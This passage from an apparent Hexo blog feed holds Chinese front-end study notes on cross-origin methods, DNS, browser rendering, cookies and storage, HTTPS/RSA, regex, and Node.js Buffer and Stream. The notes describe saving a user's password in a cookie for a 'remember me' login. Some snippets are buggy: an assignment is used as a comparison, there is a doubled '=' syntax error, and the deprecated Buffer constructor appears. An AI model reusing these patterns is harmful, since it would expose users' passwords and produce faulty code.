“baidu.com”;就可以跨域</span><br><span class="line"></span><br><span class="line">3、 location.hash + iframe</span><br><span class="line">4、 window.name + iframe跨域</span><br><span class="line">5、 postMessage跨域</span><br><span class="line">6、 跨域资源共享（CORS）  Access-Control-Allow-Origin: *</span><br><span class="line">主要通过后端来配置，CORS规范将请求分为两种类型，一种是简单请求，一种是带预检的非简单请求。</span><br><span class="line">如果是简单请求，就先执行服务端程序，然后浏览器才会判断是否跨域；GET HEAD,POST</span><br><span class="line">而对于非简单请求，浏览器会在发送实际请求之前先发送一个OPTIONS的HTTP请求来判断服务器是否能接受该跨域   请求；如果不能接受的话，浏览器会直接阻止接下来实际请求的发生。 服务端可以设置携带cooike</span><br><span class="line"></span><br><span class="line">7、 nginx代理跨域</span><br><span class="line">正向代理：我们将请求发送给代理服务器，代理服务器去访问，然后将访问到的数据传递给我们。隐藏了客户端</span><br><span class="line">反向代理：在服务器端，有很多服务器处理请求，nginx扮演的就是一个反向代理角色，隐藏了服务器。</span><br><span class="line">启动nginx服务器把server_name设置成前端的域名，此时前端发起的请求相当于是localhost对localhost发起，这样是不会引起跨域的。</span><br><span class="line"></span><br><span class="line">8、 nodejs中间件代理跨域    与nginx代理跨域类似</span><br><span class="line">9、 WebSocket协议跨域   </span><br><span class="line">     WebSocket protocol是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯</span><br></pre></td></tr></table></figure><h3 id="3-域名与DNS，浏览器输入网址到页面展示发生了什么"><a href="#3-域名与DNS，浏览器输入网址到页面展示发生了什么" class="headerlink" title="3.域名与DNS，浏览器输入网址到页面展示发生了什么"></a>3.域名与DNS，浏览器输入网址到页面展示发生了什么</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DNS（Domain Name System，域名系统），简单的说：就是把我们输入的网站域名翻译成IP地址的系统.</span><br><span class="line"></span><br><span class="line">1.在浏览器中输入url</span><br><span class="line"></span><br><span class="line">2.客户端先检查本地是否有对应的IP地址，若找到则返回响应的IP地址。若没找到则请求上级DNS服务器，直至找到</span><br><span class="line"></span><br><span class="line">3.有了服务器的IP， 浏览器就要可以发起HTTP请求了,联系之前的HTTP和HTTPS</span><br><span class="line"></span><br><span class="line">4.Http会基于TCP建立起一个到服务器的连接通道，TCP是面向连接可靠的服务，联系三次握手四次握手</span><br><span class="line">  Udp是无连接的，想发就发，不会对数据进行封装。适用于实时应用，就比如视频面试。TCP可靠，用于文件传输。</span><br><span class="line"></span><br><span class="line">5.传输层下面是网络层，作用是把TCP分割好的各种数据包传送给接收方，这里需要用到mac地址，一个网络设备的IP地   址可以更换，但是MAC地址一般是固定不变的.ARP协议可以将IP地址解析成对应的MAC地址。</span><br><span class="line"></span><br><span class="line">6.在找到对方的MAC地址后，就将数据发送到数据链路层传输。这时，客户端发送请求的阶段结束</span><br><span class="line"></span><br><span class="line">7. 接收端的服务器在链路层接收到数据包，再层层向上直到应用层。这过程中包括在运输层通过TCP协议讲分段的数据包重新组成原来的HTTP请求报文,返回响应报文，联系返回码。</span><br><span class="line"></span><br><span class="line">8.请求成功之后，服务器会返回响应的HTML文件，接下来就到页面渲染了，联系到渲染引擎。</span><br><span class="line"></span><br><span class="line">9.构建dom树-&gt;计算DOM树每个结点的样式-&gt;页面布局-&gt;生成分层树-&gt;栅格化（转化为位图，GPU可以处理）-&gt;显示</span><br></pre></td></tr></table></figure><h3 id="4-浏览器的多进程架构及渲染过程"><a href="#4-浏览器的多进程架构及渲染过程" class="headerlink" title="4. 浏览器的多进程架构及渲染过程"></a>4. 浏览器的多进程架构及渲染过程</h3><ul><li>多进程架构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Browers进程，一个只有一个</span><br><span class="line">渲染进程，一个tab窗口对应一个</span><br><span class="line">GPU进程，只有一个，负责GPU渲染</span><br><span class="line">插件进程，每个插件会创建一个进程</span><br></pre></td></tr></table></figure><ul><li>渲染过程</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个渲染进程包括三个线程，compositor线程，tile worker线程，main线程</span><br><span class="line"></span><br><span class="line">ompositor Thread 创造 Compositor Tile Worker 绘制并光栅化，生成纹理（位图）</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/03/04/35aGh8.png" alt="35aGh8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">主线程：</span><br><span class="line">js动画：要走主线程，css动画：有的不会走主线程    </span><br><span class="line">csstriggers.com这个网站里面会展示，哪些CSS不会走主线程，比如transform，但是不同浏览器不一样。</span><br><span class="line"></span><br><span class="line">主线程：构建dom树-&gt;计算DOM树每个结点的样式-&gt;页面布局-&gt;生成分层树-&gt;栅格化（转化为位图，GPU可以处理-&gt;显示</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.2</title>
      <link href="2020/03/02/%E6%97%A5%E5%B8%B8-2020.3.2/"/>
      <url>2020/03/02/%E6%97%A5%E5%B8%B8-2020.3.2/</url>
      
        <content type="html"><![CDATA[<h2 id="首先贴一道机试题"><a href="#首先贴一道机试题" class="headerlink" title="首先贴一道机试题"></a>首先贴一道机试题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">明明想在学校中请一些同学一起做一项问卷调查，为了实验的客观性，他先用计算机生成了N个1到1000之间的随机整数（N≤1000），对于其中重复的数字，只保留一个，把其余相同的数去掉，不同的数对应着不同的学生的学号。然后再把这些数从小到大排序，按照排好的顺序去找同学做调查。请你协助明明完成“去重”与“排序”的工作(同一个测试用例里可能会有多组数据，希望大家能正确处理)。</span><br><span class="line"></span><br><span class="line">Input Param</span><br><span class="line">n               输入随机数的个数</span><br><span class="line">inputArray      n个随机整数组成的数组</span><br><span class="line"></span><br><span class="line">Return Value</span><br><span class="line">OutputArray    输出处理后的随机整数</span><br><span class="line"></span><br><span class="line">注：测试用例保证输入参数的正确性，答题者无需验证。测试用例不止一组。</span><br><span class="line">样例输入解释：</span><br><span class="line">样例有两组测试</span><br><span class="line">第一组是3个数字，分别是：2，2，1。</span><br><span class="line">第二组是11个数字，分别是：10，20，40，32，67，40，20，89，300，400，15。</span><br></pre></td></tr></table></figure><a id="more"></a><p>其实这道题的实质就是去重+排序，这里有一个巧妙的算法，用数组下标来存数据，js代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> line,res,i,n</span><br><span class="line"><span class="keyword">while</span>(line=readline())&#123;      <span class="comment">//读第一行数据</span></span><br><span class="line">    res=[]</span><br><span class="line">    n=line</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;              <span class="comment">//一组n个数据</span></span><br><span class="line">        res[readline()]=<span class="number">1</span>    <span class="comment">//数组下标存数据，值代表存在</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> res)&#123;           <span class="comment">//遍历数组，值存在的输出</span></span><br><span class="line">        <span class="keyword">if</span>(res[i]=<span class="number">1</span>) <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个算法的巧妙在于，利用数组下标自动排序，重复值在数组中只存在一个。</p><h2 id="简历上的知识点"><a href="#简历上的知识点" class="headerlink" title="简历上的知识点"></a>简历上的知识点</h2><p>花了一天写完了简历，我来复习一下简历上的知识点以及深入挖掘一些知识点（没写完的明天补充）</p><ul><li>利用Cooike实现记住用户名和密码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chrome://settings/content/cookies  可在浏览器中查看Cooike</span></span><br><span class="line"><span class="comment">//首先封装了三个函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span> (<span class="params"> name, value, expdays </span>)</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">getCookie</span> (<span class="params"> name </span>)</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">delCookie</span> (<span class="params"> name </span>)</span></span><br><span class="line"><span class="function">//然后点击登录按钮后会获取用户的用户名和密码</span></span><br><span class="line"><span class="function">//然后会判断用户是否选择了记住密码选项，若选择了则<span class="title">SetCooike</span>，否则<span class="title">delCooike</span></span></span><br><span class="line"><span class="function">//<span class="title">window</span>.<span class="title">onload</span>函数中会<span class="title">getCooike</span>若存在则填充</span></span><br></pre></td></tr></table></figure><ul><li>Cooike,sessionStorge,localStorge</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cooike始终在同源的HTTP请求中携带，会在浏览器和服务器之间传递。</span><br><span class="line">sessionStorge和localStorge不会发送给服务器，仅在本地保存</span><br><span class="line">Cooike不能超过4k，session和local一般小于5M</span><br><span class="line">localStorge存储的是持久数据，浏览器关闭不丢失。SessionStorge在关闭窗口后会自动删除。</span><br></pre></td></tr></table></figure><ul><li>什么是同源的HTTP请求</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同源是指：就是协议、域名和端口号    不同源的客户端脚本是不可以互相读数据的</span><br></pre></td></tr></table></figure><ul><li>首先来说一下协议HTTP和HTTPS</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https并非应用层的一种新协议，只是http通信接口部分用ssl/tls协议代替而已。</span><br><span class="line">SSL和TLS都是加密协议</span><br><span class="line">通常http直接和tcp通信，当使用ssl时则演变成先和ssl通信，再由ssl和tcp通信。</span><br><span class="line">所谓https，其实就是身披ssl协议这层外壳的http。（回忆一下osi7层,TCP/IP4层，我们学的是5层）</span><br><span class="line"></span><br><span class="line">SSL协议采用的是非对称加密算法，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密.</span><br><span class="line"></span><br><span class="line">RSA算法：两个大素数p,q，n=pq,f(n)=(p-1)(q-1),1&lt;b&lt;f(n),a=b^-1modf(n),公钥n,b,私钥p,q,a</span><br><span class="line"></span><br><span class="line">证书，顾名思义，就是证明的文件。例如浏览器和 tlanyan.me 服务器通信，浏览器怎么知道对方就是 tlanyan.me 对应的服务器呢？在不可信的网络下通信，中立的第三方作用就显现出来了。权威的第三方中立机构（ Certificate Authority, CA）收到 tlanyan.me 持有者的证书请求并核验信息后，将持有者的名称、公钥与 CA 用私钥生成的数字签名等信息写成证书颁发给申请者。</span><br></pre></td></tr></table></figure><p><img src="https://images2018.cnblogs.com/blog/801336/201806/801336-20180602081838664-361436590.png" alt="2"></p><ul><li>三次握手，四次握手</li><li>前端安全问题</li><li>关于域名，经典问题，输入域名到展示页面发生了什么</li><li>端口标志一个进程，浏览器的多进程</li><li><p>跨域问题</p></li><li><p>正则表达式判断邮箱是否合法</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pattern = <span class="regexp">/^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]&#123;2,4&#125;)$/</span>;</span><br><span class="line"><span class="comment">//字符+@+字符+.+字母</span></span><br></pre></td></tr></table></figure><ul><li>复习一下正则的基本知识</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.横向模糊匹配,一个正则可匹配的字符串的长度不是固定的</span></span><br><span class="line"><span class="comment">//比如/ab&#123;2,5&#125;c/表示匹配这样一个字符串：第一个字符是“a”，接下来是2到5个字符“b”，最后是字符“c”</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/ab&#123;2,5&#125;c/g</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc abbc abbbc abbbbc abbbbbc abbbbbbc"</span>;</span><br><span class="line"><span class="built_in">console</span>.log( string.match(regex) ); </span><br><span class="line"><span class="comment">// =&gt; ["abbc", "abbbc", "abbbbc", "abbbbbc"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.纵向模糊匹配，一个正则匹配的字符串，具体到某一位字符时，它可以不是某个确定的字符</span></span><br><span class="line"><span class="comment">//比如/a[123]b/可以匹配如下三种字符串："a1b"、"a2b"、"a3b"。测试如下：</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/a[123]b/g</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"a0b a1b a2b a3b a4b"</span>;</span><br><span class="line"><span class="built_in">console</span>.log( string.match(regex) ); </span><br><span class="line"><span class="comment">// =&gt; ["a1b", "a2b", "a3b"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.范围表示法，比如[123456abcdefGHIJKLM]，可以写成[1-6a-fG-M]</span></span><br><span class="line"><span class="comment">//要匹配“a”、“-”、“z”这三者中任意一个字符，不能写成[a-z]，可以写成如下的方式：[-az]或[az-]或[a\-z]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.排除字符组</span></span><br><span class="line"><span class="keyword">var</span> regex = = <span class="regexp">/[^abc]/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.常见简写</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\d就是[0-9]。表示是一位数字。记忆方式：其英文是digit（数字）。</span></span><br><span class="line"><span class="comment">\D就是[^0-9]。表示除数字外的任意字符。</span></span><br><span class="line"><span class="comment">\w就是[0-9a-zA-Z_]。表示数字、大小写字母和下划线。记忆方式：w是word的简写，也称单词字符。</span></span><br><span class="line"><span class="comment">\W是[^0-9a-zA-Z_]。非单词字符。</span></span><br><span class="line"><span class="comment">\s是[ \t\v\n\r\f]。表示空白符，包括空格、水平制表符、垂直制表符、换行符、回车符、换页符。记忆方式：s是space character的首字母。</span></span><br><span class="line"><span class="comment">\S是[^ \t\v\n\r\f]。 非空白符。</span></span><br><span class="line"><span class="comment">.通配符，表示几乎任意字符。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//6.多选分支</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/good|nice/g</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"good idea, nice try."</span>;</span><br><span class="line"><span class="built_in">console</span>.log( string.match(regex) ); </span><br><span class="line"><span class="comment">// =&gt; ["good", "nice"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//7. ^代表开头，$代表结尾</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js中处理数据I/O</title>
      <link href="2019/05/05/Node.js-Node.js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AEIO/"/>
      <url>2019/05/05/Node.js-Node.js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AEIO/</url>
      
        <content type="html"><![CDATA[<p>Node.js中提供了处理文件和网络I/O的功能，因此需要处理大量的二进制数据。在Node.js中，Buffer缓冲区和Stream文件流对二进制数据的处理提供了很好的支持。</p><h1 id="5-1-Buffer缓冲区"><a href="#5-1-Buffer缓冲区" class="headerlink" title="5.1 Buffer缓冲区"></a>5.1 Buffer缓冲区</h1><p>Buffer类是随Node.js内核一起发布的核心库，用于支持I/O操作中移动的数据处理。</p><h2 id="5-1-2-Buffer的构造函数"><a href="#5-1-2-Buffer的构造函数" class="headerlink" title="5.1.2 Buffer的构造函数"></a>5.1.2 Buffer的构造函数</h2><p>Node.js中的Buffer缓冲区模块，支持开发者在缓冲区结构中创建，读取，写入和操作二进制数据，该模块是全局性的，所以在使用时不需要require（）函数来加载。</p><ol><li>传入字节</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(size);</span><br></pre></td></tr></table></figure><a id="more"></a><ol start="2"><li>传入数组</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer([<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>]);</span><br></pre></td></tr></table></figure><ol start="3"><li>传入字符串和编码</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(<span class="string">"hello"</span>,<span class="string">"utf-8"</span>);</span><br></pre></td></tr></table></figure><p>Buffer同样支持以下编码：</p><ul><li>ascii：7位ASCII字符</li><li>utf16le：两个字节，16位小端字节序</li><li>usc2：两个字节，以小尾字节序编码的Unicode字符</li><li>base64：用于传输8字节代码的编码方式之一</li><li>hex：Hex字符串编码</li></ul><h2 id="5-1-3-写入缓冲区"><a href="#5-1-3-写入缓冲区" class="headerlink" title="5.1.3 写入缓冲区"></a>5.1.3 写入缓冲区</h2><p><code>buf.write(string,offset,length,encoding) //字符串，索引值，字节数，编码</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(<span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf.length);</span><br><span class="line">buf.write(<span class="string">'a'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf);</span><br><span class="line"><span class="comment">//写入b时需要在第二个参数传入缓冲区开始写入的索引值</span></span><br><span class="line">buf.write(<span class="string">'b'</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">'ascii'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//5</span></span><br><span class="line"><span class="comment">//&lt;Buffer 61 00 00 00 00&gt;</span></span><br><span class="line"><span class="comment">//&lt;Buffer 61 62 00 00 00&gt;</span></span><br></pre></td></tr></table></figure><h2 id="5-1-4-从缓冲区读取数据"><a href="#5-1-4-从缓冲区读取数据" class="headerlink" title="5.1.4 从缓冲区读取数据"></a>5.1.4 从缓冲区读取数据</h2><p><code>buf.toString(encoding,start,end)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(<span class="number">26</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span> ; i++)&#123;</span><br><span class="line">    buf[i] = i + <span class="number">97</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出全部</span></span><br><span class="line"><span class="built_in">console</span>.log(buf.toString(<span class="string">'ascii'</span>));</span><br><span class="line"><span class="comment">//输出前5个</span></span><br><span class="line"><span class="built_in">console</span>.log(buf.toString(<span class="string">'ascii'</span>,<span class="number">0</span>,<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//abcdefghijklmnopqrstuvwxyz</span></span><br><span class="line"><span class="comment">//abcde</span></span><br></pre></td></tr></table></figure><h2 id="5-1-5拼接缓冲区"><a href="#5-1-5拼接缓冲区" class="headerlink" title="5.1.5拼接缓冲区"></a>5.1.5拼接缓冲区</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(<span class="string">'世上无难事'</span>);</span><br><span class="line"><span class="keyword">var</span> buf1 = <span class="keyword">new</span> Buffer(<span class="string">'只怕有心人'</span>);</span><br><span class="line"><span class="keyword">var</span> buf2 = Buffer.concat([buf,buf1]);</span><br><span class="line"><span class="built_in">console</span>.log(buf2.toString());</span><br><span class="line"><span class="comment">//输出：世上无难事只怕有心人</span></span><br></pre></td></tr></table></figure><h1 id="5-2-Stream文件流"><a href="#5-2-Stream文件流" class="headerlink" title="5.2 Stream文件流"></a>5.2 Stream文件流</h1><p>由于Buffer缓冲区限制在1GB，超过1GB的文件无法直接完成读写操作，在读写大文件时，如果读写资源一直持续不停止，Node.js将无法继续其他工作，为此Node.js中提供了Stream文件流模块。</p><h2 id="5-2-1-文件流的概念"><a href="#5-2-1-文件流的概念" class="headerlink" title="5.2.1 文件流的概念"></a>5.2.1 文件流的概念</h2><p>例如复制文件的过程，文件流的概念就是文件A中数据以流动的方式通过数据流管道，然后进入到文件B中，采用”读一部分，写一部分“的方式，就像看视频，下一点播一点。</p><p>在Node.js中，文件流的操作由Stream模块提供，Stream模块是一个抽象接口，Node.js中还有很多对象实现了这个接口，有4种流类型：</p><ul><li>Readable: 可读流</li><li>Writeable：可写流</li><li>Duplex：可读可写流</li><li>Transform：变换流（操作被写入数据，然后读出结果）</li></ul><p>Node.js中的I/O是异步的，因此对磁盘和网络的读/写需要通过回调函数来读取数据，而回调函数需要通过事件来触发，所有的Stream对象都是EventEmitter(时间触发器)的实例。</p><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td>data</td><td>当有数据可读时触发</td></tr><tr><td>end</td><td>没有更多的数据可读时触发</td></tr><tr><td>error</td><td>在接收和写入过程中发生错误时触发</td></tr><tr><td>finish</td><td>所有数据都已被写入到低层系统时触发</td></tr></tbody></table><h2 id="5-2-2-Node-js的可读流和可写流"><a href="#5-2-2-Node-js的可读流和可写流" class="headerlink" title="5.2.2 Node.js的可读流和可写流"></a>5.2.2 Node.js的可读流和可写流</h2><ol><li>可读流</li></ol><p>使用文件流进行文件复制，首先需要创建一个可读流，可读流可以让用户在源文件中分块读取文件中的数据，然后再从可读流中读取数据。</p><p><code>fs.createReadStream()</code></p><p>由于流是基于EventEmitter的，从流读取数据最好的方法是监听数据事件（data event），并附加一个回调函数，返回数据，这个操作是循环进制的，一直到读取完毕。在读取错误或读取完毕时触发error或end事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs= <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">let</span> total = <span class="string">""</span>;</span><br><span class="line"><span class="comment">//创建可读流</span></span><br><span class="line"><span class="keyword">let</span> readableStream = fs.createReadStream(<span class="string">'input.txt'</span>);<span class="comment">//此时流为静止状态</span></span><br><span class="line"><span class="comment">//设置编码为utf-8</span></span><br><span class="line">readableStream.setEncoding(<span class="string">'UTF8'</span>);</span><br><span class="line"><span class="comment">//处理流事件</span></span><br><span class="line">readableStream.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;<span class="comment">//附加回调函数，流开始流动</span></span><br><span class="line">    total += chunk;</span><br><span class="line">&#125;);</span><br><span class="line">readableStream.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(total);</span><br><span class="line">&#125;);</span><br><span class="line">readableStream.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err.stack);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"程序执行完毕"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出：程序执行完毕</span></span><br><span class="line"><span class="comment">//input.txt中的内容</span></span><br></pre></td></tr></table></figure><ol start="2"><li>可写流</li></ol><p><code>fs.createWriteStream()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs= <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">let</span> total = <span class="string">""</span>;</span><br><span class="line"><span class="comment">//创建可读流</span></span><br><span class="line"><span class="keyword">let</span> readableStream = fs.createReadStream(<span class="string">'input.txt'</span>);</span><br><span class="line"><span class="comment">//创建可写流</span></span><br><span class="line"><span class="keyword">let</span> writableStream = fs.createWriteStream(<span class="string">'output.txt'</span>);</span><br><span class="line"><span class="comment">//设置编码为utf-8</span></span><br><span class="line">readableStream.setEncoding(<span class="string">'UTF8'</span>);</span><br><span class="line">readableStream.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">    writableStream.write(chunk);</span><br><span class="line">&#125;);</span><br><span class="line">readableStream.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err.stack);</span><br><span class="line">&#125;);</span><br><span class="line">readableStream.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    writableStream.end();<span class="comment">//将剩下的数据全部写入</span></span><br><span class="line">&#125;);</span><br><span class="line">writableStream.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err.stack);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="5-2-3使用pipe-处理大文件"><a href="#5-2-3使用pipe-处理大文件" class="headerlink" 